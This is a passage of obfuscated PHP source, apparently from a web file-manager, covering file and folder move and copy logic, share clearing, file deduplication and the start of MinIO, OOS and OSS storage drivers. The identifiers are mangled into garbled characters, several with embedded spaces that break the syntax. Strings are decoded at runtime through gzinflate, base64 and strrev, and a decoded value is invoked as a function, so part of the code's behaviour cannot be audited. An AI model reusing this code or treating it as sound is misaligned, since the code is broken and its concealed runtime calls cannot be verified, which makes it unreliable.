b¢Äò’Ìèô: $f®òÔİÇÅ = $this->sourceInfo($Cò¿ÃµÚ†); $e±Ş‡Òêç = $this->fileHistory($f®òÔİÇÅ, $E°ĞÑÑÜ™Ê[$F”‘ºŒæ¿[441]], $E°ĞÑÑÜ™Ê[$F”‘ºŒæ¿[77]]); if (!$e±Ş‡Òêç) { Model($F”‘ºŒæ¿[444])->remove($E°ĞÑÑÜ™Ê[$F”‘ºŒæ¿[441]]); } goto f™ºöø‡»„; f™ºöø‡»„: $this->removeNow($Déê±ŒÒ’º, !1); $this->folderSizeReset($e¼èàè¤Çï); Hook::trigger($F”‘ºŒæ¿[554], $fÃê¿êÏÛÇ); goto a‹æ·È© ‘; a³î£Î¢êì: } } $Bìœë¢à’ = $C„ä‹ÍÒ£ ? $C„ä‹ÍÒ£ : $E°ĞÑÑÜ™Ê[$F”‘ºŒæ¿[28]]; $this->lockMoveStart($Déê±ŒÒ’º); goto b¬Şò´‚; E³ß‘‰áÇ: if ($E°ĞÑÑÜ™Ê[$F”‘ºŒæ¿[397]] == $F”‘ºŒæ¿[86] && $eô²Ğå‚Ã) { $this->folderSizeResetChildren($E¥³„ŠŞöˆ); } Model($F”‘ºŒæ¿[173])->linkAdd($Cº‘ÉŸ˜‚‡[$F”‘ºŒæ¿[524]]); if ($eô²Ğå‚Ã && $Cº‘ÉŸ˜‚‡[$F”‘ºŒæ¿[555]]) { $this->removeNow($Déê±ŒÒ’º, !1); } goto aàİ¸–íˆ·; E•Úñ¶Ö¥: $eô²Ğå‚Ã = $this->fileNameExistCache($e¼èàè¤Çï, $E°ĞÑÑÜ™Ê[$F”‘ºŒæ¿[28]]); $E¥³„ŠŞöˆ = $this->_move($Déê±ŒÒ’º, $e¼èàè¤Çï, $c´æ²‹Ó“, $Cº‘ÉŸ˜‚‡, $C„ä‹ÍÒ£); $this->sourceCacheClear(); goto E³ß‘‰áÇ; fÂØ´ŠËë‚: if ($E°ĞÑÑÜ™Ê[$F”‘ºŒæ¿[472]] == $a’ÌÃ‚‘ƒ[$F”‘ºŒæ¿[390]]) { if ($E°ĞÑÑÜ™Ê[$F”‘ºŒæ¿[417]] == $F”‘ºŒæ¿[86]) { Model($F”‘ºŒæ¿[415])->restore(array($Déê±ŒÒ’º)); } if (!$C„ä‹ÍÒ£ || $C„ä‹ÍÒ£ == $E°ĞÑÑÜ™Ê[$F”‘ºŒæ¿[28]]) { return $Déê±ŒÒ’º; } } $fÃê¿êÏÛÇ = $this->pathInfoMore($Déê±ŒÒ’º); if ($this->isParentOf($Déê±ŒÒ’º, $e¼èàè¤Çï)) { return !1; } goto cŸÆ¿‹óœ’; cŸÆ¿‹óœ’: if (!$E°ĞÑÑÜ™Ê || !$a’ÌÃ‚‘ƒ || $a’ÌÃ‚‘ƒ[$F”‘ºŒæ¿[397]] != $F”‘ºŒæ¿[86]) { return !1; } Hook::trigger($F”‘ºŒæ¿[553], $fÃê¿êÏÛÇ); $this->targetIsDelete = intval($E°ĞÑÑÜ™Ê[$F”‘ºŒæ¿[417]]); goto AÊÏÀÍÄˆ; aàİ¸–íˆ·: $this->lockMoveEnd($Déê±ŒÒ’º); $this->lockWriteEnd($e¼èàè¤Çï, $Bìœë¢à’); $this->folderSizeReset($E°ĞÑÑÜ™Ê[$F”‘ºŒæ¿[472]]); goto C¹®‚÷â¢; D·˜­ãñäß: $F”‘ºŒæ¿ =& $_SERVER[ç]; $E°ĞÑÑÜ™Ê = $this->sourceInfo($Déê±ŒÒ’º); $a’ÌÃ‚‘ƒ = $this->sourceInfo($e¼èàè¤Çï); goto fÂØ´ŠËë‚; bª¾Û»äç: return $E¥³„ŠŞöˆ; goto B×’ÄÈ›½É; b¬Şò´‚: $this->lockWriteStart($e¼èàè¤Çï, $Bìœë¢à’); $Cº‘ÉŸ˜‚‡ = array($F”‘ºŒæ¿[524] => array(), $F”‘ºŒæ¿[555] => !1); $this->clearShare($Déê±ŒÒ’º, $e¼èàè¤Çï); goto E•Úñ¶Ö¥; B×’ÄÈ›½É: } private function _move($D¼³ç‘œ¼¨, $dùÉñ°õëì, $f¯½¨ï¹öÂ, &$fÙë”Úµ°, $Bˆ¥ŠÍÒÚà = '') { goto F‡œ–ÅÔ¿; bî¦ğùáÄ’: $fƒ’±Œº›ô = $Bˆ¥ŠÍÒÚà ? $Bˆ¥ŠÍÒÚà : $CòØĞƒ˜[$f¼Šï÷Á­[28]]; $EŒåôÉß­ = $this->fileNameExistCache($dùÉñ°õëì, $fƒ’±Œº›ô); $this->lockMoveStart($D¼³ç‘œ¼¨); goto cŠŸ ÁÛ±İ; cŠŸ ÁÛ±İ: $this->lockWriteStart($dùÉñ°õëì, $fƒ’±Œº›ô); if (!$EŒåôÉß­) { return $this->_moveForce($D¼³ç‘œ¼¨, $dùÉñ°õëì, $fƒ’±Œº›ô); } $FÙâ½·ÔŸ = $EŒåôÉß­; goto E‘È‹âôßÔ; F‡œ–ÅÔ¿: $f¼Šï÷Á­ =& $_SERVER[ç]; $CòØĞƒ˜ = $this->sourceInfo($D¼³ç‘œ¼¨); $CËÅ¿·Œ°ˆ = $CòØĞƒ˜[$f¼Šï÷Á­[397]] == $f¼Šï÷Á­[86]; goto bî¦ğùáÄ’; b“ƒ°µˆ‚: return $FÙâ½·ÔŸ; goto b‡Íƒ›ÅÊ; E‘È‹âôßÔ: $Eğ¡‹‘†·È = !1; if ($CËÅ¿·Œ°ˆ) { if ($f¯½¨ï¹öÂ == REPEAT_RENAME_FOLDER) { $fƒ’±Œº›ô = $this->fileNameAuto($dùÉñ°õëì, $fƒ’±Œº›ô, $f¯½¨ï¹öÂ, $CËÅ¿·Œ°ˆ); $FÙâ½·ÔŸ = $this->_moveForce($D¼³ç‘œ¼¨, $dùÉñ°õëì, $fƒ’±Œº›ô); } else { if ($f¯½¨ï¹öÂ == REPEAT_RENAME_FOLDER) { $f¯½¨ï¹öÂ = REPEAT_RENAME; } $cÖÒö»ğÃ = $this->_childrenListSelect($D¼³ç‘œ¼¨); foreach ($cÖÒö»ğÃ as $AŒŒ¿¾Œé‘) { $this->_move($AŒŒ¿¾Œé‘[$f¼Šï÷Á­[390]], $EŒåôÉß­, $f¯½¨ï¹öÂ, $fÙë”Úµ°); } $Eğ¡‹‘†·È = !0; } } else { if ($f¯½¨ï¹öÂ == REPEAT_SKIP) { $Eğ¡‹‘†·È = !0; } else { if ($f¯½¨ï¹öÂ == REPEAT_RENAME || $f¯½¨ï¹öÂ == REPEAT_RENAME_FOLDER) { $fƒ’±Œº›ô = $this->fileNameAuto($dùÉñ°õëì, $fƒ’±Œº›ô, $f¯½¨ï¹öÂ, $CËÅ¿·Œ°ˆ); $FÙâ½·ÔŸ = $this->_moveForce($D¼³ç‘œ¼¨, $dùÉñ°õëì, $fƒ’±Œº›ô); } else { if ($f¯½¨ï¹öÂ == REPEAT_REPLACE) { $b¯ˆàœ¨ˆ« = $this->sourceInfoCache($EŒåôÉß­); $aƒôã…Ûë = $this->fileHistory($b¯ˆàœ¨ˆ«, $CòØĞƒ˜[$f¼Šï÷Á­[441]], $CòØĞƒ˜[$f¼Šï÷Á­[77]]); if ($aƒôã…Ûë) { $fÙë”Úµ°[$f¼Šï÷Á­[524]][] = $CòØĞƒ˜[$f¼Šï÷Á­[441]]; } else { $Eğ¡‹‘†·È = !0; } } } } } if ($Eğ¡‹‘†·È && !$fÙë”Úµ°[$f¼Šï÷Á­[555]]) { $fÙë”Úµ°[$f¼Šï÷Á­[555]] = !0; } goto b“ƒ°µˆ‚; b‡Íƒ›ÅÊ: } private function _moveForce($cÄÖê³ë²à, $e§İÊŠ…™, $B‡áÁ†Üâ¶) { goto CËğÄÈ³¦Ç; cÈŠÌéšîò: $E‡¥ÔÁ´ = $c’áÂ¹—–[$A¥¡¶îÉÙ¥[397]] == $A¥¡¶îÉÙ¥[86]; $c¿ƒ„ŸÕŠ¿ = array($A¥¡¶îÉÙ¥[389] => $FÁš³ã…¼²[$A¥¡¶îÉÙ¥[390]], $A¥¡¶îÉÙ¥[548] => $FÁš³ã…¼²[$A¥¡¶îÉÙ¥[481]] . $FÁš³ã…¼²[$A¥¡¶îÉÙ¥[390]] . $A¥¡¶îÉÙ¥[47], $A¥¡¶îÉÙ¥[544] => $FÁš³ã…¼²[$A¥¡¶îÉÙ¥[398]], $A¥¡¶îÉÙ¥[545] => $FÁš³ã…¼²[$A¥¡¶îÉÙ¥[478]], $A¥¡¶îÉÙ¥[547] => USER_ID, $A¥¡¶îÉÙ¥[407] => $B‡áÁ†Üâ¶); $aˆïÔ£¿à = $c’áÂ¹—–[$A¥¡¶îÉÙ¥[398]] == SourceModel::TYPE_GROUP && $FÁš³ã…¼²[$A¥¡¶îÉÙ¥[398]] == SourceModel::TYPE_GROUP && $c’áÂ¹—–[$A¥¡¶îÉÙ¥[478]] == $FÁš³ã…¼²[$A¥¡¶îÉÙ¥[478]]; goto D’‹´¤Ó»é; CËğÄÈ³¦Ç: $A¥¡¶îÉÙ¥ =& $_SERVER[ç]; $c’áÂ¹—– = $this->sourceInfo($cÄÖê³ë²à); $FÁš³ã…¼² = $this->sourceInfo($e§İÊŠ…™); goto cÈŠÌéšîò; D’‹´¤Ó»é: if (!$aˆïÔ£¿à && $this->moveClearAuth) { Model($A¥¡¶îÉÙ¥[476])->authClear($cÄÖê³ë²à); } $DÕ²—ÑËĞ = $c’áÂ¹—–[$A¥¡¶îÉÙ¥[417]] == $A¥¡¶îÉÙ¥[86] && $FÁš³ã…¼²[$A¥¡¶îÉÙ¥[417]] != $A¥¡¶îÉÙ¥[86]; if ($DÕ²—ÑËĞ) { $c¿ƒ„ŸÕŠ¿[$A¥¡¶îÉÙ¥[416]] = 0; } goto cÂÏèÛÃÀ²; cÂÏèÛÃÀ²: if ($E‡¥ÔÁ´) { $eÀ„Ò©¤ = array($A¥¡¶îÉÙ¥[548] => array($A¥¡¶îÉÙ¥[507], $c’áÂ¹—–[$A¥¡¶îÉÙ¥[481]] . $c’áÂ¹—–[$A¥¡¶îÉÙ¥[390]] . $A¥¡¶îÉÙ¥[508])); $e¯›‰âª½ = $c’áÂ¹—–[$A¥¡¶îÉÙ¥[481]] . $c’áÂ¹—–[$A¥¡¶îÉÙ¥[390]] . $A¥¡¶îÉÙ¥[47]; $a¬œ“Üé…á = $FÁš³ã…¼²[$A¥¡¶îÉÙ¥[481]] . $FÁš³ã…¼²[$A¥¡¶îÉÙ¥[390]] . $A¥¡¶îÉÙ¥[47] . $c’áÂ¹—–[$A¥¡¶îÉÙ¥[390]] . $A¥¡¶îÉÙ¥[47]; $D†Î”ğÌ”® = array($A¥¡¶îÉÙ¥[548] => array($A¥¡¶îÉÙ¥[556], "\x72\145\x70\x6c\141\x63\x65\50\x70\141\162\x65\156\164\114\x65\x76\145\x6c\54\x27{$e¯›‰âª½}\47\54\x27{$a¬œ“Üé…á}\47\x29"), $A¥¡¶îÉÙ¥[544] => $FÁš³ã…¼²[$A¥¡¶îÉÙ¥[398]], $A¥¡¶îÉÙ¥[545] => $FÁš³ã…¼²[$A¥¡¶îÉÙ¥[478]]); if ($DÕ²—ÑËĞ) { $D†Î”ğÌ”®[$A¥¡¶îÉÙ¥[416]] = 0; } $this->where($eÀ„Ò©¤)->data($D†Î”ğÌ”®)->save(); } $this->where(array($A¥¡¶îÉÙ¥[404] => $cÄÖê³ë²à))->data($c¿ƒ„ŸÕŠ¿)->save(); return $cÄÖê³ë²à; goto F½â…†í¥; F½â…†í¥: } private function clearShare($d¦¦¼Ö·¡¨, $BÔ…°Ú‘Å) { goto C­ùòç¸¾à; Fğ¾É–ƒÄ: if (!$D±¹ô Óß) { return; } $cù•¢ÒÙ£Ê = array($CœŸˆÁğˆê[390] => array($CœŸˆÁğˆê[7], $D±¹ô Óß), $CœŸˆÁğˆê[469] => 1); $aê÷Í¨¹» = Model($CœŸˆÁğˆê[558])->field($CœŸˆÁğˆê[462])->where($cù•¢ÒÙ£Ê)->select(); goto dÂÌ†ç¡¬˜; e‡ç¯ØÉ: Model($CœŸˆÁğˆê[558])->where($cù•¢ÒÙ£Ê)->save(array($CœŸˆÁğˆê[469] => 0)); Model($CœŸˆÁğˆê[559])->where($cù•¢ÒÙ£Ê)->delete(); goto Dˆ…ì˜ÑÉÌ; C‹™¹Çè×Å: if ($eÍƒ©çÛâˆ[$CœŸˆÁğˆê[478]] == $AÆŠ†˜ÓÉÈ[$CœŸˆÁğˆê[478]] && $eÍƒ©çÛâˆ[$CœŸˆÁğˆê[398]] == $CœŸˆÁğˆê[557]) { return; } $cù•¢ÒÙ£Ê = array($CœŸˆÁğˆê[481] => array($CœŸˆÁğˆê[507], $eÍƒ©çÛâˆ[$CœŸˆÁğˆê[481]] . $d¦¦¼Ö·¡¨ . $CœŸˆÁğˆê[508])); $D±¹ô Óß = $this->field($CœŸˆÁğˆê[404])->where($cù•¢ÒÙ£Ê)->getField($CœŸˆÁğˆê[390], !0); goto Fğ¾É–ƒÄ; dÂÌ†ç¡¬˜: if (!$aê÷Í¨¹») { return; } $aê÷Í¨¹» = array_to_keyvalue($aê÷Í¨¹», $CœŸˆÁğˆê[33], $CœŸˆÁğˆê[462]); $cù•¢ÒÙ£Ê = array($CœŸˆÁğˆê[462] => array($CœŸˆÁğˆê[7], $aê÷Í¨¹»)); goto e‡ç¯ØÉ; C­ùòç¸¾à: $CœŸˆÁğˆê =& $_SERVER[ç]; $eÍƒ©çÛâˆ = $this->sourceInfo($d¦¦¼Ö·¡¨); $AÆŠ†˜ÓÉÈ = $this->sourceInfo($BÔ…°Ú‘Å); goto C‹™¹Çè×Å; Dˆ…ì˜ÑÉÌ: } public function copyFolderFromIO($dÌ¤½´„“Ù, $c§»«·Ô‡œ, $E¨Ï¨µ×î, $dôçÀï×â½, $f³‰£ÛÆï×, $E«áîñÎ‹Ø = false) { goto BçÙçÙİª±; BçÙçÙİª±: $A¤öÂî—¿Ó =& $_SERVER[ç]; $BàÏÙ¥ « = array($A¤öÂî—¿Ó[525] => array(), $A¤öÂî—¿Ó[526] => array(), $A¤öÂî—¿Ó[524] => array(), $A¤öÂî—¿Ó[560] => array()); $F™ ×Œá‚Ù = $E«áîñÎ‹Ø ? $E«áîñÎ‹Ø : $dÌ¤½´„“Ù->pathThis($c§»«·Ô‡œ); goto F‚±÷½Åø; aœíÅŠ‚¨Î: $this->updateModifyTime($E¨Ï¨µ×î); return $aæ¾¶‹†§É; goto aö˜é±¡•‡; fÆ¾Øï‰–Õ: Model($A¤öÂî—¿Ó[444])->linkAdd($BàÏÙ¥ «[$A¤öÂî—¿Ó[524]]); Model($A¤öÂî—¿Ó[444])->remove($BàÏÙ¥ «[$A¤öÂî—¿Ó[560]]); $this->folderSizeReset($E¨Ï¨µ×î); goto aœíÅŠ‚¨Î; f‚é‡İÒõÁ: Model($A¤öÂî—¿Ó[527])->addAll($BàÏÙ¥ «[$A¤öÂî—¿Ó[525]], array(), !0); Model($A¤öÂî—¿Ó[528])->eventCopy($aæ¾¶‹†§É); $this->saveAll($BàÏÙ¥ «[$A¤öÂî—¿Ó[526]]); goto fÆ¾Øï‰–Õ; F‚±÷½Åø: $f‹†—êÛ = $this->fileNameExist($E¨Ï¨µ×î, $F™ ×Œá‚Ù); $aæ¾¶‹†§É = $this->mkdir($E¨Ï¨µ×î, $F™ ×Œá‚Ù, $dôçÀï×â½); if (!$f‹†—êÛ || $dôçÀï×â½ == REPEAT_RENAME_FOLDER) { $dôçÀï×â½ = !1; } goto fÅ¿ÃÌòàô; fÅ¿ÃÌòàô: if ($f‹†—êÛ) { $this->_childrenAllMake($f‹†—êÛ); } Hook::trigger($A¤öÂî—¿Ó[561]); $this->_copyChildTo($dÌ¤½´„“Ù, $c§»«·Ô‡œ, $aæ¾¶‹†§É, $dôçÀï×â½, $BàÏÙ¥ «, $f³‰£ÛÆï×); goto e¶ãª ­Á¯; e¶ãª ­Á¯: Hook::trigger($A¤öÂî—¿Ó[562]); if ($aæ¾¶‹†§É) { $this->folderSizeResetChildren($aæ¾¶‹†§É); } $this->_childrenListClear(); goto f‚é‡İÒõÁ; aö˜é±¡•‡: } private function _copyChildTo($E¼’ĞÆ©é», $EÚùÖã¢††, $bÍ¸×¥ò…’, $eİôÍ«¡, &$A·Ç”»‡ö, $C’ùÕÎ¿Ï) { goto C«íùÇ§™İ; C«íùÇ§™İ: $fäâÒŸóÔ„ =& $_SERVER[ç]; $E˜÷ºƒŠ‘Ê = $this->sourceInfoCache($bÍ¸×¥ò…’); $a‚Ä‡¯Ã˜ = $E¼’ĞÆ©é»->listPath($EÚùÖã¢††); goto CëÖÙ‡Ï¤¦; CëÖÙ‡Ï¤¦: $A›ÅòßíáÁ = array_merge($a‚Ä‡¯Ã˜[$fäâÒŸóÔ„[73]], $a‚Ä‡¯Ã˜[$fäâÒŸóÔ„[74]]); $d“Ìã•‘‰Ğ = $this->_addFiles($E¼’ĞÆ©é», $a‚Ä‡¯Ã˜[$fäâÒŸóÔ„[73]], $C’ùÕÎ¿Ï); $cÊ–¹ç×½ = array(); goto fÄèÔ¡²¼; fÄèÔ¡²¼: foreach ($A›ÅòßíáÁ as &$e…É•ÎÌ§) { goto E”ñé›ƒÍ™; dàŸÔ¸ò¸: if ($eİôÍ«¡) { $fï¬¨«Ñ²ô = $this->fileNameExistCache($bÍ¸×¥ò…’, $e…É•ÎÌ§[$fäâÒŸóÔ„[28]]); if ($fï¬¨«Ñ²ô) { if ($e…É•ÎÌ§[$fäâÒŸóÔ„[397]] || $eİôÍ«¡ == REPEAT_SKIP) { continue; } if ($eİôÍ«¡ == REPEAT_REPLACE) { $B‰éĞé„¸¨ = $this->sourceInfoCache($fï¬¨«Ñ²ô); $AÃ›öåì¤Œ = $this->fileHistory($B‰éĞé„¸¨, $e…É•ÎÌ§[$fäâÒŸóÔ„[441]], $e…É•ÎÌ§[$fäâÒŸóÔ„[77]]); if ($AÃ›öåì¤Œ) { $A·Ç”»‡ö[$fäâÒŸóÔ„[524]][] = $e…É•ÎÌ§[$fäâÒŸóÔ„[441]]; } continue; } else { if ($eİôÍ«¡ == REPEAT_RENAME) { $e…É•ÎÌ§[$fäâÒŸóÔ„[28]] = $this->fileNameAutoCache($bÍ¸×¥ò…’, $e…É•ÎÌ§[$fäâÒŸóÔ„[28]], $eİôÍ«¡, !1); } } } } if (!$e…É•ÎÌ§[$fäâÒŸóÔ„[397]] && $e…É•ÎÌ§[$fäâÒŸóÔ„[441]]) { $A·Ç”»‡ö[$fäâÒŸóÔ„[524]][] = $e…É•ÎÌ§[$fäâÒŸóÔ„[441]]; } $cÊ–¹ç×½[] = $this->_makeItemData($e…É•ÎÌ§, $E˜÷ºƒŠ‘Ê, $e…É•ÎÌ§[$fäâÒŸóÔ„[28]]); goto f‰½ñš×¤Ú; d¨ˆ‹ÕÜÑ÷: $e…É•ÎÌ§[$fäâÒŸóÔ„[77]] = _get($e…É•ÎÌ§, $fäâÒŸóÔ„[77], 0); $e…É•ÎÌ§[$fäâÒŸóÔ„[441]] = _get($e…É•ÎÌ§, $fäâÒŸóÔ„[441], 0); if (!isset($e…É•ÎÌ§[$fäâÒŸóÔ„[563]]) && $e…É•ÎÌ§[$fäâÒŸóÔ„[441]]) { $A·Ç”»‡ö[$fäâÒŸóÔ„[560]][] = $e…É•ÎÌ§[$fäâÒŸóÔ„[441]]; } goto dàŸÔ¸ò¸; E”ñé›ƒÍ™: if (isset($d“Ìã•‘‰Ğ[$e…É•ÎÌ§[$fäâÒŸóÔ„[28]]])) { $e…É•ÎÌ§ = $d“Ìã•‘‰Ğ[$e…É•ÎÌ§[$fäâÒŸóÔ„[28]]]; } $e…É•ÎÌ§[$fäâÒŸóÔ„[397]] = $e…É•ÎÌ§[$fäâÒŸóÔ„[29]] == $fäâÒŸóÔ„[76]; $e…É•ÎÌ§[$fäâÒŸóÔ„[399]] = _get($e…É•ÎÌ§, $fäâÒŸóÔ„[167], $fäâÒŸóÔ„[33]); goto d¨ˆ‹ÕÜÑ÷; f‰½ñš×¤Ú: } unset($e…É•ÎÌ§); if (!empty($cÊ–¹ç×½)) { $this->addAll($cÊ–¹ç×½); $this->_childrenListSelect($bÍ¸×¥ò…’); } goto fÔ‘Ö”Ù´Å; fÔ‘Ö”Ù´Å: $a¥ò¿í÷õ = $this->_childrenList($bÍ¸×¥ò…’); $a¥ò¿í÷õ = array_to_keyvalue($a¥ò¿í÷õ, $fäâÒŸóÔ„[28]); foreach ($A›ÅòßíáÁ as $e…É•ÎÌ§) { $B‰éĞé„¸¨ = $a¥ò¿í÷õ[$e…É•ÎÌ§[$fäâÒŸóÔ„[28]]]; $f¶òÏÂŸì = $B‰éĞé„¸¨[$fäâÒŸóÔ„[390]]; $this->_copyApplyMeta($B‰éĞé„¸¨, $A·Ç”»‡ö); if ($e…É•ÎÌ§[$fäâÒŸóÔ„[29]] == $fäâÒŸóÔ„[76]) { $e…É•ÎÌ§[$fäâÒŸóÔ„[75]] = $E¼’ĞÆ©é»->getPathInner($e…É•ÎÌ§[$fäâÒŸóÔ„[75]]); $this->_copyChildTo($E¼’ĞÆ©é», $e…É•ÎÌ§[$fäâÒŸóÔ„[75]], $f¶òÏÂŸì, $eİôÍ«¡, $A·Ç”»‡ö, $C’ùÕÎ¿Ï); } } goto DöåÊ¡®ç; DöåÊ¡®ç: } private function _addFiles($f„ÀÔ‚éçĞ, $F…®Ü„Ü…ä, $b‡­Ô”²Ğô) { goto fÓÊÑ… £‹; F›ŸŞŠˆ å: foreach ($F…®Ü„Ü…ä as &$c¨‰äƒÜÀŒ) { goto aªƒ¢‹ÒÈˆ; eöğÇÍ›ù: if (count($bå‡ìÄõ[$BÊÉ¤¢Ç´”]) > 1) { $c¨‰äƒÜÀŒ[$cøÓ·ƒ–—[563]] = !0; } goto D­ùè˜ñØÃ; aªƒ¢‹ÒÈˆ: Hook::trigger($cøÓ·ƒ–—[564], $c¨‰äƒÜÀŒ); $c¨‰äƒÜÀŒ[$cøÓ·ƒ–—[75]] = $f„ÀÔ‚éçĞ->getPathInner($c¨‰äƒÜÀŒ[$cøÓ·ƒ–—[75]]); $ašß´äŞ¤§ = $f„ÀÔ‚éçĞ->hashSimple($c¨‰äƒÜÀŒ[$cøÓ·ƒ–—[75]]); goto D‹ÒçÉ×¼õ; EÇçóåï·: $c¨‰äƒÜÀŒ[$cøÓ·ƒ–—[169]] = $BÊÉ¤¢Ç´”; Hook::trigger($cøÓ·ƒ–—[565], $c¨‰äƒÜÀŒ); $bå‡ìÄõ[$BÊÉ¤¢Ç´”][] =& $c¨‰äƒÜÀŒ; goto eöğÇÍ›ù; D‹ÒçÉ×¼õ: $BÊÉ¤¢Ç´” = $f„ÀÔ‚éçĞ->hashMd5($c¨‰äƒÜÀŒ[$cøÓ·ƒ–—[75]]); if (strlen($BÊÉ¤¢Ç´”) > 10 && !isset($bå‡ìÄõ[$BÊÉ¤¢Ç´”])) { $bå‡ìÄõ[$BÊÉ¤¢Ç´”] = array(); } $c¨‰äƒÜÀŒ[$cøÓ·ƒ–—[170]] = $ašß´äŞ¤§; goto EÇçóåï·; D­ùè˜ñØÃ: } unset($c¨‰äƒÜÀŒ); $d³œéøÏõ = array($cøÓ·ƒ–—[169] => array($cøÓ·ƒ–—[7], array_keys($bå‡ìÄõ))); goto d‹ğ½­”’Ù; fÓÊÑ… £‹: $cøÓ·ƒ–— =& $_SERVER[ç]; if (!$F…®Ü„Ü…ä || count($F…®Ü„Ü…ä) == 0) { return array(); } $bå‡ìÄõ = array(); goto F›ŸŞŠˆ å; d‹ğ½­”’Ù: $aó²ƒ§—óÒ = Model($cøÓ·ƒ–—[566]); $bµÔá’Ö–„ = $aó²ƒ§—óÒ->where($d³œéøÏõ)->select(); $bµÔá’Ö–„ = $bµÔá’Ö–„ ? $bµÔá’Ö–„ : array(); goto a©ˆ–±İ; AóÛ•™ŠÕ®: $aó²ƒ§—óÒ->addAll($e­ª·Œ¿ÉĞ); $d³œéøÏõ = array($cøÓ·ƒ–—[169] => array($cøÓ·ƒ–—[7], array_keys($bå‡ìÄõ))); $bµÔá’Ö–„ = $aó²ƒ§—óÒ->where($d³œéøÏõ)->select(); goto fÌµ ƒ…âÀ; a©ˆ–±İ: foreach ($bµÔá’Ö–„ as $e³™øö‚²) { if (!isset($bå‡ìÄõ[$e³™øö‚²[$cøÓ·ƒ–—[169]]])) { continue; } $AÆØ…ùèŠÁ = $bå‡ìÄõ[$e³™øö‚²[$cøÓ·ƒ–—[169]]]; foreach ($AÆØ…ùèŠÁ as &$c¨‰äƒÜÀŒ) { $c¨‰äƒÜÀŒ[$cøÓ·ƒ–—[441]] = $e³™øö‚²[$cøÓ·ƒ–—[441]]; $c¨‰äƒÜÀŒ[$cøÓ·ƒ–—[563]] = !0; } unset($c¨‰äƒÜÀŒ); } $e­ª·Œ¿ÉĞ = array(); foreach ($F…®Ü„Ü…ä as $bÑ¶Ä·á) { if (isset($bÑ¶Ä·á[$cøÓ·ƒ–—[563]]) && $bÑ¶Ä·á[$cøÓ·ƒ–—[563]]) { continue; } $d×ÈÜ²Ç¨Œ = $f„ÀÔ‚éçĞ->getPathInner($bÑ¶Ä·á[$cøÓ·ƒ–—[75]]); $dÔìë¬Ä¹’ = $aó²ƒ§—óÒ->addFileMake($d×ÈÜ²Ç¨Œ, $bÑ¶Ä·á[$cøÓ·ƒ–—[77]], $bÑ¶Ä·á[$cøÓ·ƒ–—[170]], $bÑ¶Ä·á[$cøÓ·ƒ–—[169]], $bÑ¶Ä·á[$cøÓ·ƒ–—[28]], $b‡­Ô”²Ğô); $e­ª·Œ¿ÉĞ[] = $dÔìë¬Ä¹’; } goto AóÛ•™ŠÕ®; fÌµ ƒ…âÀ: $bµÔá’Ö–„ = $bµÔá’Ö–„ ? $bµÔá’Ö–„ : array(); foreach ($bµÔá’Ö–„ as $e³™øö‚²) { if (!isset($bå‡ìÄõ[$e³™øö‚²[$cøÓ·ƒ–—[169]]])) { continue; } $dÉõÉŒ£æŠ =& $bå‡ìÄõ[$e³™øö‚²[$cøÓ·ƒ–—[169]]]; foreach ($dÉõÉŒ£æŠ as &$c¨‰äƒÜÀŒ) { $c¨‰äƒÜÀŒ[$cøÓ·ƒ–—[441]] = $e³™øö‚²[$cøÓ·ƒ–—[441]]; } unset($c¨‰äƒÜÀŒ); } $a‡¬‘…œÖ‘ = array(); goto aÙ¯Ó; aÙ¯Ó: foreach ($F…®Ü„Ü…ä as $dØ¼ï‹ÁÕ) { $a‡¬‘…œÖ‘[$dØ¼ï‹ÁÕ[$cøÓ·ƒ–—[28]]] = $dØ¼ï‹ÁÕ; } return $a‡¬‘…œÖ‘; goto DÍÏÂ—ºŞ; DÍÏÂ—ºŞ: } } define($_SERVER[ç][567], $_SERVER[ç][568]); goto Bë×â‹õ»—; C“×”“ï—©: define($_SERVER[ç][0], $_SERVER[ç][1]); $_SERVER[ı] = explode($_SERVER[ç][2], gzinflate(substr($_SERVER[ç][3], 10, -8))); function binCheckEq($AË‰‡ùÆ¯â, $cŒ„òš¡´) { return $AË‰‡ùÆ¯â == $cŒ„òš¡´; } goto c´°ìÓÎæ; c´°ìÓÎæ: $A‰…›¾œŞ = strrev(base64_decode($_SERVER[ı][0])); function binCheckNeq($F“İ’öŞ½¢, $A½œ÷‹–Øˆ) { return $F“İ’öŞ½¢ != $A½œ÷‹–Øˆ; } $_SERVER[$_SERVER[ı][1]] = $A‰…›¾œŞ($_SERVER[$_SERVER[ı][2]]); goto D’Çê÷»éÅ; A£‰ÓÉ„Ö: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($bèßÍ¡÷†ì) { parent::__construct($bèßÍ¡÷†ì); $this->signatureVersion($_SERVER[ç][210]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($eê·Æİ•–) { parent::__construct($eê·Æİ•–); $this->signatureVersion($_SERVER[ç][210]); } public function fileOutLink($bØ˜ã‡‚÷Š) { $AÚŞÂ¹Ü¬ø =& $_SERVER[ç]; if (substr($bØ˜ã‡‚÷Š, 0, 7) == $AÚŞÂ¹Ü¬ø[1169]) { $bØ˜ã‡‚÷Š = $AÚŞÂ¹Ü¬ø[1170] . substr($bØ˜ã‡‚÷Š, 7); } header($AÚŞÂ¹Ü¬ø[158] . $bØ˜ã‡‚÷Š); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($Aõ„Ã‘Á«) { parent::__construct(); include_once SDK_DIR . $_SERVER[ç][1224]; $this->_init($Aõ„Ã‘Á«); } public function _init($d§ö‹Şœõø) { $dç ¥•Ñ¿ =& $_SERVER[ç]; foreach ($d§ö‹Şœõø as $BÁ¬Âš¶Š => $e¹ô³ ƒìà) { if (isset($this->{$BÁ¬Âš¶Š})) { $this->{$BÁ¬Âš¶Š} = $e¹ô³ ƒìà; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($dç ¥•Ñ¿[1225] . LNG($dç ¥•Ñ¿[1226])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto aÄà“Ì»‚; E¬¶¯Úâ”…: $F¥Ã’†Ãˆ§->addAllowedMethod($Eòˆ‰ÌÖæ[1230]); $F¥Ã’†Ãˆ§->addAllowedMethod($Eòˆ‰ÌÖæ[1231]); $F¥Ã’†Ãˆ§->addAllowedMethod($Eòˆ‰ÌÖæ[157]); goto D’¯¥¨ˆ±; 